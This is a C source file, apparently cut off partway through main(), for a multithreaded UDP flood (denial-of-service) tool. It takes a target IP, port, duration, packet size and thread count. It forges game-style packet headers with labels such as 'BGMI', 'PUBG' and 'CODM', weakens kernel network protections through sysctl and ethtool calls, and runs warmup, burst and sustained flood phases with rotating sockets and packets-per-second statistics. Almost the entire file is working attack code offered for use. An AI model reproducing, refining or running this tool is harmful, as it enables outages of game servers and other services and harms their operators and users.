#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>
#include <signal.h>

#define MIN_TIME 10
#define MAX_TIME 300
#define MIN_PACKET_SIZE 24
#define MAX_PACKET_SIZE 82
#define MIN_THREADS 150
#define MAX_THREADS 500
#define PORT_RANGE 50000
#define MIN_SRC_PORT 10000
#define MAX_SRC_PORT 60000
#define BATCH_UPDATE 10000
#define SOCKET_SNDBUF 134217728
#define SOCKET_RCVBUF 67108864
#define MAX_TOTAL_THREADS 600
#define STATS_UPDATE_INTERVAL 1
#define RECONNECT_RETRIES 3
#define RECONNECT_INTERVAL 10000
#define REORDER_CHANCE 10
#define INSTANT_BURST_PACKETS 1200000
#define PHASE1_POWER 200
#define PHASE2_POWER 200
#define PHASE3_POWER 200
#define BOOST_INTERVAL 5
#define FLOOD_SOCKETS_BASE 200
#define MAX_STACK_SIZE 2048
#define WARMUP_SECONDS 8
#define PATTERN_CHANGE_INTERVAL 3
#define MAX_BURST_MULTIPLIER 15

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;
int ACTIVE_FLOOD_SOCKETS;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int should_attack = 0;
_Atomic int attack_seconds = 0;
_Atomic int total_elapsed = 0;
_Atomic int sync_counter = 0;
_Atomic int threads_ready = 0;
_Atomic int instant_burst_done = 0;
_Atomic int boost_trigger = 0;
_Atomic int total_attack_time = 0;
_Atomic int warmup_complete = 0;
_Atomic int warmup_phase = 0;
_Atomic int current_pattern = 0;
_Atomic int pattern_change_counter = 0;
_Atomic int burst_multiplier = 10;
_Atomic unsigned long long warmup_packets_sent = 0;
_Atomic unsigned long long instant_burst_packets_sent = 0;

struct sockaddr_in target_addr;

void signal_handler(int sig) {
    atomic_store(&stop_signal, 1);
}

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=2147483648 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=536870912 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=2147483648 >/dev/null 2>&1");
    system("sysctl -w net.core.rmem_default=536870912 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=20000000 >/dev/null 2>&1");
    system("sysctl -w net.core.optmem_max=134217728 >/dev/null 2>&1");
    system("sysctl -w net.core.somaxconn=2097152 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='100663296 201326592 402653184' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=1048576 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=1048576 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range='1024 65000' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_ecn=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.conf.all.accept_source_route=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.conf.default.accept_source_route=1 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.conf.default.rp_filter=0 >/dev/null 2>&1");
    system("sysctl -w vm.swappiness=0 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_ratio=95 >/dev/null 2>&1");
    system("sysctl -w vm.dirty_background_ratio=80 >/dev/null 2>&1");
    system("sysctl -w vm.overcommit_memory=1 >/dev/null 2>&1");
    system("sysctl -w vm.min_free_kbytes=524288 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_min_granularity_ns=10000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_wakeup_granularity_ns=5000 >/dev/null 2>&1");
    system("sysctl -w kernel.sched_migration_cost_ns=0 >/dev/null 2>&1");
    system("ulimit -n 4194304 >/dev/null 2>&1");
    system("ulimit -u unlimited >/dev/null 2>&1");
    system("sysctl -w kernel.threads-max=1000000 >/dev/null 2>&1");
    system("sysctl -w kernel.pid_max=1000000 >/dev/null 2>&1");
    system("for iface in $(ip -o link show | awk -F': ' '{print $2}' 2>/dev/null); do "
           "ethtool -K $iface tx off rx off sg off tso off gso off gro off lro off 2>/dev/null; "
           "ethtool -G $iface rx 32768 tx 32768 2>/dev/null; "
           "ethtool -C $iface rx-usecs 0 rx-frames 0 tx-usecs 0 tx-frames 0 2>/dev/null; "
           "ip link set $iface txqueuelen 10000 2>/dev/null; "
           "done 2>/dev/null");
#endif
}

int set_sock_buf(int sock) {
    int sndbuf = SOCKET_SNDBUF;
    int rcvbuf = SOCKET_RCVBUF;
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) return -1;
    if (setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) return -1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    int size = 65536;
    setsockopt(sock, SOL_SOCKET, SO_SNDLOWAT, &size, sizeof(size));
    setsockopt(sock, SOL_SOCKET, SO_RCVLOWAT, &size, sizeof(size));
    return 0;
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed ^ (*seed >> 16);
}

int should_reorder_packet(unsigned int *seed) {
    return (fast_rand(seed) % 100) < REORDER_CHANCE;
}

void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int pattern_type) {
    int actual_size = size;
    if (actual_size < MIN_PACKET_SIZE) actual_size = MIN_PACKET_SIZE;
    if (actual_size > MAX_PACKET_SIZE) actual_size = MAX_PACKET_SIZE;
    int dynamic_size = actual_size;
    int size_group = fast_rand(seed) % 100;
    if (size_group < 20) {
        int sizes[] = {24, 26, 28, 30, 32, 34, 36, 38, 40, 42};
        dynamic_size = sizes[(thread_id + seq + pattern_type) % 10];
    }
    else if (size_group < 60) {
        int sizes[] = {44, 46, 48, 50, 52, 54, 56, 58, 60, 62};
        dynamic_size = sizes[(thread_id + seq + pattern_type) % 10];
    }
    else {
        int sizes[] = {64, 66, 68, 70, 72, 74, 76, 78, 80, 82};
        dynamic_size = sizes[(thread_id + seq + pattern_type) % 10];
    }
    if (dynamic_size > actual_size) dynamic_size = actual_size;
    if (dynamic_size < MIN_PACKET_SIZE) dynamic_size = MIN_PACKET_SIZE;
    int buffer_needed = (dynamic_size > 20) ? dynamic_size : 20;
    memset(buf, 0, buffer_needed);
    if (buffer_needed >= 20) {
        int pattern = pattern_type % 8;
        switch(pattern) {
            case 0: buf[0] = 0x42; buf[1] = 0x47; buf[2] = 0x4D; buf[3] = 0x49; break;
            case 1: buf[0] = 0x50; buf[1] = 0x55; buf[2] = 0x42; buf[3] = 0x47; break;
            case 2: buf[0] = 0x43; buf[1] = 0x4F; buf[2] = 0x44; buf[3] = 0x4D; break;
            case 3: buf[0] = 0x46; buf[1] = 0x41; buf[2] = 0x4B; buf[3] = 0x45; break;
            case 4: buf[0] = fast_rand(seed) & 0xFF; buf[1] = fast_rand(seed) & 0xFF; buf[2] = fast_rand(seed) & 0xFF; buf[3] = fast_rand(seed) & 0xFF; break;
            case 5: buf[0] = 0x00; buf[1] = 0xFF; buf[2] = 0x00; buf[3] = 0xFF; break;
            case 6: buf[0] = 0x42; buf[1] = fast_rand(seed) & 0xFF; buf[2] = 0x4D; buf[3] = fast_rand(seed) & 0xFF; break;
            case 7: buf[0] = 0x49; buf[1] = 0x4D; buf[2] = 0x47; buf[3] = 0x42; break;
        }
        unsigned int *header = (unsigned int*)(buf + 4);
        int packet_types[][8] = {
            {0x00010001, 0x00010002, 0x00020001, 0x00030001, 0x00040001, 0x00050001, 0x00060001, 0x00070001},
            {0x00010003, 0x00010004, 0x00020002, 0x00030002, 0x00040002, 0x00050002, 0x00060002, 0x00070002},
            {0x00010005, 0x00010006, 0x00020003, 0x00030003, 0x00040003, 0x00050003, 0x00060003, 0x00070003},
            {0x00010007, 0x00010008, 0x00020004, 0x00030004, 0x00040004, 0x00050004, 0x00060004, 0x00070004},
            {0x00010009, 0x0001000A, 0x00020005, 0x00030005, 0x00040005, 0x00050005, 0x00060005, 0x00070005},
            {0x0001000B, 0x0001000C, 0x00020006, 0x00030006, 0x00040006, 0x00050006, 0x00060006, 0x00070006},
            {0x0001000D, 0x0001000E, 0x00020007, 0x00030007, 0x00040007, 0x00050007, 0x00060007, 0x00070007},
            {0x0001000F, 0x00010010, 0x00020008, 0x00030008, 0x00040008, 0x00050008, 0x00060008, 0x00070008}
        };
        int pattern_idx = pattern_type % 8;
        int type_idx = (thread_id + seq + pattern_type) % 8;
        header[0] = packet_types[pattern_idx][type_idx];
        unsigned int reorder_seq = seq;
        if (should_reorder_packet(seed) && seq > 30) reorder_seq = seq - (15 + (fast_rand(seed) % 30));
        header[1] = htonl(reorder_seq + thread_id * 1000000);
        header[2] = htonl((unsigned int)time(NULL));
        int header_variant = pattern_type % 12;
        switch(header_variant) {
            case 0: header[3] = 0x00000001 + (seq % 5); break;
            case 1: header[3] = 0x00000010 + (seq % 7); break;
            case 2: header[3] = 0x00000100 + (seq % 3); break;
            case 3: header[3] = 0x00001000 + (seq % 9); break;
            case 4: header[3] = 0x00010000 + (seq % 4); break;
            case 5: header[3] = 0x00100000 + (seq % 6); break;
            case 6: header[3] = 0x01000000 + (seq % 2); break;
            case 7: header[3] = 0x10000000 + (seq % 8); break;
            case 8: header[3] = fast_rand(seed); break;
            case 9: header[3] = htonl(seq * 777); break;
            case 10: header[3] = htonl(thread_id * 999999); break;
            case 11: header[3] = htonl(time(NULL) % 65536); break;
        }
    }
    int payload_start = 20;
    if (payload_start > dynamic_size) payload_start = dynamic_size;
    for (int i = payload_start; i < dynamic_size; i++) {
        int rand_type = (i + pattern_type) % 4;
        switch(rand_type) {
            case 0: buf[i] = (fast_rand(seed) + i) & 0xFF; break;
            case 1: buf[i] = (thread_id + seq + i) & 0xFF; break;
            case 2: buf[i] = ((fast_rand(seed) * i) + pattern_type) & 0xFF; break;
            case 3: buf[i] = (time(NULL) + i + thread_id) & 0xFF; break;
        }
    }
    int ff_positions[] = {payload_start, payload_start + 1, payload_start + 2, dynamic_size - 1, dynamic_size - 2, dynamic_size - 3};
    for (int p = 0; p < 6; p++) {
        if (ff_positions[p] >= payload_start && ff_positions[p] < dynamic_size) {
            if ((fast_rand(seed) % 100) < (8 + pattern_type % 8)) buf[ff_positions[p]] = 0xFF;
        }
    }
}

int reconnect_socket(int *sock, unsigned int *seed) {
    if (*sock >= 0) {
        shutdown(*sock, SHUT_RDWR);
        close(*sock);
        *sock = -1;
    }
    for (int retry = 0; retry < RECONNECT_RETRIES; retry++) {
        int new_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (new_sock >= 0) {
            *sock = new_sock;
            break;
        }
        usleep(500);
    }
    if (*sock < 0) return -1;
    if (set_sock_buf(*sock) < 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    fcntl(*sock, F_SETFL, O_NONBLOCK | O_ASYNC);
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(*sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
        close(*sock);
        *sock = -1;
        return -1;
    }
    return 0;
}

int get_current_power() {
    return 200;
}

int get_current_pattern() {
    return atomic_load(&current_pattern);
}

int get_burst_multiplier() {
    int mult = atomic_load(&burst_multiplier);
    if (mult > MAX_BURST_MULTIPLIER) {
        mult = MAX_BURST_MULTIPLIER;
        atomic_store(&burst_multiplier, mult);
    }
    return mult;
}

void *warmup_thread(void *arg) {
    int thread_id = *((int *)arg);
    int packets_per_phase[] = {15625, 15625, 15625, 15625, 15625, 15625, 15625, 15625};
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    if (set_sock_buf(s) < 0) {
        close(s);
        return NULL;
    }
    fcntl(s, F_SETFL, O_NONBLOCK);
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_id * 987654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    char *packet = malloc(MAX_PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    unsigned int seq = thread_id * 1000000;
    int phase_total_packets = 0;
    for (int phase = 0; phase < 8 && !atomic_load(&stop_signal); phase++) {
        int packets_this_phase = packets_per_phase[phase];
        for (int i = 0; i < packets_this_phase && !atomic_load(&stop_signal); i++) {
            create_bgmi_packet(packet, PACKET_SIZE, thread_id + 50000, seq + phase_total_packets + i, &seed, get_current_pattern() + thread_id % 4);
            int ret = sendto(s, packet, PACKET_SIZE, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret == PACKET_SIZE) {
                atomic_fetch_add(&warmup_packets_sent, 1);
            }
        }
        phase_total_packets += packets_this_phase;
        sleep(1);
    }
    free(packet);
    close(s);
    return NULL;
}

void *instant_burst_thread(void *arg) {
    int thread_id = *((int *)arg);
    int packets_per_thread = INSTANT_BURST_PACKETS / THREAD_COUNT;
    if (thread_id == 0) packets_per_thread += (INSTANT_BURST_PACKETS % THREAD_COUNT);
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    if (set_sock_buf(s) < 0) {
        close(s);
        return NULL;
    }
    fcntl(s, F_SETFL, O_NONBLOCK);
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_id * 987654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    char *packet = malloc(MAX_PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    unsigned int seq = thread_id * 1000000;
    int actually_sent = 0;
    for (int i = 0; i < packets_per_thread && !atomic_load(&stop_signal); i++) {
        create_bgmi_packet(packet, PACKET_SIZE, thread_id + 10000, seq + i, &seed, get_current_pattern() + thread_id % 4);
        int retries = 3;
        while (retries > 0 && !atomic_load(&stop_signal)) {
            int ret = sendto(s, packet, PACKET_SIZE, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret == PACKET_SIZE) {
                actually_sent++;
                atomic_fetch_add(&instant_burst_packets_sent, 1);
                break;
            }
            retries--;
            usleep(1000);
        }
    }
    free(packet);
    close(s);
    return NULL;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int actual_flood_sockets = ACTIVE_FLOOD_SOCKETS;
    if (actual_flood_sockets > 500) actual_flood_sockets = 500;
    int *socks = malloc(actual_flood_sockets * sizeof(int));
    char **packets = malloc(actual_flood_sockets * sizeof(char*));
    if (!socks || !packets) {
        if (socks) free(socks);
        if (packets) free(packets);
        return NULL;
    }
    for (int i = 0; i < actual_flood_sockets; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (thread_idx * 1234567) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    int max_packet_size = MAX_PACKET_SIZE;
    for (int i = 0; i < actual_flood_sockets; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        if (set_sock_buf(socks[i]) < 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr)) != 0) {
            close(socks[i]);
            socks[i] = -1;
            continue;
        }
        packets[i] = malloc(max_packet_size);
        if (!packets[i]) {
            close(socks[i]);
            socks[i] = -1;
        }
    }
    atomic_fetch_add(&threads_ready, 1);
    while (!atomic_load(&should_attack) && !atomic_load(&stop_signal)) usleep(1000);
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_counter = thread_idx * 1000000;
    unsigned int *packets_sent = calloc(actual_flood_sockets, sizeof(unsigned int));
    if (!packets_sent) {
        for (int i = 0; i < actual_flood_sockets; i++) {
            if (socks[i] >= 0) close(socks[i]);
            if (packets[i]) free(packets[i]);
        }
        free(socks);
        free(packets);
        return NULL;
    }
    int optimal_burst;
    if (PACKET_SIZE <= 40) optimal_burst = 500 + (fast_rand(&seed) % 200);
    else if (PACKET_SIZE <= 56) optimal_burst = 400 + (fast_rand(&seed) % 150);
    else optimal_burst = 300 + (fast_rand(&seed) % 100);
    int last_boost = 0;
    int last_sync = 0;
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        int power_level = get_current_power();
        int burst_mult = get_burst_multiplier();
        int current_size = PACKET_SIZE;
        if (current_size > MAX_PACKET_SIZE) current_size = MAX_PACKET_SIZE;
        if (current_size < MIN_PACKET_SIZE) current_size = MIN_PACKET_SIZE;
        if (atomic_load(&boost_trigger) != last_boost) {
            last_boost = atomic_load(&boost_trigger);
            optimal_burst = optimal_burst * 130 / 100;
        }
        if (atomic_load(&sync_counter) != last_sync) {
            last_sync = atomic_load(&sync_counter);
            for (int i = 0; i < actual_flood_sockets; i++) {
                if (socks[i] >= 0) {
                    reconnect_socket(&socks[i], &seed);
                    packets_sent[i] = 0;
                }
            }
        }
        for (int i = 0; i < actual_flood_sockets && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || !packets[i]) continue;
            if (packets_sent[i] > RECONNECT_INTERVAL) {
                if (reconnect_socket(&socks[i], &seed) == 0) packets_sent[i] = 0;
            }
            create_bgmi_packet(packets[i], current_size, thread_idx + 1000, seq_counter, &seed, get_current_pattern() + thread_idx % 4);
            int current_burst = (optimal_burst * power_level * burst_mult) / (100 * 10);
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                int ret = sendto(socks[i], packets[i], current_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (ret == current_size) {
                    local_packets++;
                    local_bytes += current_size;
                    seq_counter++;
                    packets_sent[i]++;
                } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    if (reconnect_socket(&socks[i], &seed) < 0) {
                        free(packets[i]);
                        packets[i] = NULL;
                        socks[i] = -2;
                    } else packets_sent[i] = 0;
                    break;
                }
            }
        }
        if (local_packets >= BATCH_UPDATE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        usleep(10);
    }
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    for (int i = 0; i < actual_flood_sockets; i++) {
        if (socks[i] >= 0) close(socks[i]);
        if (packets[i]) free(packets[i]);
    }
    free(socks);
    free(packets);
    free(packets_sent);
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    long num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cores > 0) {
        int core = tid % num_cores;
        CPU_SET(core, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
    usleep((tid % 20) * 1000);
    int s = -1;
    struct timeval ts;
    gettimeofday(&ts, NULL);
    unsigned int seed = (tid * 7654321) ^ getpid() ^ (ts.tv_usec & 0xFFFF);
    char *packet = malloc(MAX_PACKET_SIZE);
    if (!packet) return NULL;
    atomic_fetch_add(&threads_ready, 1);
    while (!atomic_load(&should_attack) && !atomic_load(&stop_signal)) usleep(1000);
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int seq_local = tid * 777777;
    unsigned int packets_sent = 0;
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) {
        free(packet);
        return NULL;
    }
    if (set_sock_buf(s) < 0) {
        close(s);
        free(packet);
        return NULL;
    }
    fcntl(s, F_SETFL, O_NONBLOCK);
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(MIN_SRC_PORT + (fast_rand(&seed) % PORT_RANGE));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        free(packet);
        return NULL;
    }
    int packets_per_burst;
    int sleep_microseconds;
    if (PACKET_SIZE <= 40) {
        packets_per_burst = 200 + (tid % 150);
        sleep_microseconds = 250;
    } else if (PACKET_SIZE <= 56) {
        packets_per_burst = 250 + (tid % 180);
        sleep_microseconds = 200;
    } else {
        packets_per_burst = 300 + (tid % 220);
        sleep_microseconds = 150;
    }
    int last_boost = 0;
    int last_sync = 0;
    while (!atomic_load(&stop_signal)) {
        if (!atomic_load(&should_attack)) {
            usleep(1000);
            continue;
        }
        int power_level = get_current_power();
        int burst_mult = get_burst_multiplier();
        if (packets_sent > RECONNECT_INTERVAL) {
            reconnect_socket(&s, &seed);
            packets_sent = 0;
        }
        if (atomic_load(&boost_trigger) != last_boost) {
            last_boost = atomic_load(&boost_trigger);
            packets_per_burst = packets_per_burst * 140 / 100;
        }
        if (atomic_load(&sync_counter) != last_sync) {
            last_sync = atomic_load(&sync_counter);
            reconnect_socket(&s, &seed);
            packets_sent = 0;
        }
        int current_size = PACKET_SIZE;
        if (current_size > MAX_PACKET_SIZE) current_size = MAX_PACKET_SIZE;
        if (current_size < MIN_PACKET_SIZE) current_size = MIN_PACKET_SIZE;
        create_bgmi_packet(packet, current_size, tid, seq_local, &seed, get_current_pattern() + tid % 4);
        int current_burst = (packets_per_burst * power_level * burst_mult) / (100 * 10);
        int divisor = (power_level >= 100) ? (power_level / 100) : 1;
        if (divisor == 0) divisor = 1;
        int current_sleep = sleep_microseconds / divisor;
        if (current_sleep < 5) current_sleep = 5;
        for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
            int ret = sendto(s, packet, current_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (ret == current_size) {
                local_packets++;
                local_bytes += current_size;
                seq_local++;
                packets_sent++;
            } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                if (reconnect_socket(&s, &seed) < 0) break;
                packets_sent = 0;
                break;
            }
        }
        if (local_packets >= 5000) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        if (current_sleep > 0) {
            struct timespec ts;
            ts.tv_sec = 0;
            ts.tv_nsec = current_sleep * 1000;
            nanosleep(&ts, NULL);
        }
    }
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    free(packet);
    if (s >= 0) close(s);
    return NULL;
}

void *warmup_controller(void *arg) {
    pthread_t warmup_threads[8];
    int warmup_tids[8];
    for (int i = 0; i < 8; i++) {
        warmup_tids[i] = i;
        pthread_create(&warmup_threads[i], NULL, warmup_thread, &warmup_tids[i]);
    }
    for (int phase = 0; phase < 8 && !atomic_load(&stop_signal); phase++) {
        sleep(1);
        atomic_fetch_add(&total_elapsed, 1);
    }
    for (int i = 0; i < 8; i++) pthread_join(warmup_threads[i], NULL);
    if (!atomic_load(&stop_signal)) {
        atomic_store(&warmup_complete, 1);
    }
    return NULL;
}

void *attack_controller(void *arg) {
    while (!atomic_load(&warmup_complete) && !atomic_load(&stop_signal)) usleep(50000);
    while (atomic_load(&threads_ready) < (THREAD_COUNT / 2)) usleep(50000);
    pthread_t *burst_threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *burst_tids = malloc(THREAD_COUNT * sizeof(int));
    if (!burst_threads || !burst_tids) {
        if (burst_threads) free(burst_threads);
        if (burst_tids) free(burst_tids);
        atomic_store(&stop_signal, 1);
        return NULL;
    }
    for (int i = 0; i < THREAD_COUNT; i++) {
        burst_tids[i] = i;
        pthread_create(&burst_threads[i], NULL, instant_burst_thread, &burst_tids[i]);
    }
    for (int i = 0; i < THREAD_COUNT; i++) pthread_join(burst_threads[i], NULL);
    free(burst_threads);
    free(burst_tids);
    atomic_store(&instant_burst_done, 1);
    atomic_store(&should_attack, 1);
    int boost_counter = 0;
    int pattern_counter = 0;
    for (int sec = 0; sec < ATTACK_TIME && !atomic_load(&stop_signal); sec++) {
        sleep(1);
        atomic_fetch_add(&attack_seconds, 1);
        atomic_fetch_add(&total_elapsed, 1);
        atomic_fetch_add(&total_attack_time, 1);
        if (sec % PATTERN_CHANGE_INTERVAL == 0) {
            atomic_fetch_add(&current_pattern, 1);
            pattern_counter++;
        }
        if (sec > 0 && sec % 10 == 0) {
            int current_mult = atomic_load(&burst_multiplier);
            if (current_mult < MAX_BURST_MULTIPLIER) atomic_store(&burst_multiplier, current_mult + 1);
        }
        if (sec > 0 && sec % BOOST_INTERVAL == 0) atomic_fetch_add(&boost_trigger, 1);
        if (sec > 0 && sec % 10 == 0) atomic_fetch_add(&sync_counter, 1);
    }
    atomic_store(&stop_signal, 1);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    time_t last_update = time(NULL);
    while (!atomic_load(&stop_signal)) {
        sleep(STATS_UPDATE_INTERVAL);
        time_t now = time(NULL);
        int elapsed = (int)(now - last_update);
        if (elapsed == 0) elapsed = 1;
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        unsigned long long packets_diff = curr_packets - prev_packets;
        unsigned long long pps = packets_diff / elapsed;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        atomic_store(&current_pps, pps);
        if (pps > atomic_load(&peak_pps)) atomic_store(&peak_pps, pps);
        if (atomic_load(&should_attack)) {
            printf("🔥  PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, atomic_load(&peak_pps)/1000, megabytes);
        }
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        last_update = now;
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    char *endptr;
    TARGET_PORT = (int)strtol(argv[2], &endptr, 10);
    if (*endptr != '\0' || TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    ATTACK_TIME = (int)strtol(argv[3], &endptr, 10);
    if (*endptr != '\0' || ATTACK_TIME < MIN_TIME) ATTACK_TIME = MIN_TIME;
    if (ATTACK_TIME > MAX_TIME) ATTACK_TIME = MAX_TIME;
    PACKET_SIZE = (int)strtol(argv[4], &endptr, 10);
    if (*endptr != '\0' || PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    THREAD_COUNT = (int)strtol(argv[5], &endptr, 10);
    if (*endptr != '\0' || THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
#ifdef __linux__
    long max_threads = sysconf(_SC_THREAD_THREADS_MAX);
    if (max_threads > 0 && THREAD_COUNT > max_threads - 50) THREAD_COUNT = max_threads - 50;
    if (THREAD_COUNT > MAX_TOTAL_THREADS) THREAD_COUNT = MAX_TOTAL_THREADS;
#endif
    ACTIVE_FLOOD_SOCKETS = FLOOD_SOCKETS_BASE;
    if (THREAD_COUNT > 300) ACTIVE_FLOOD_SOCKETS = 150;
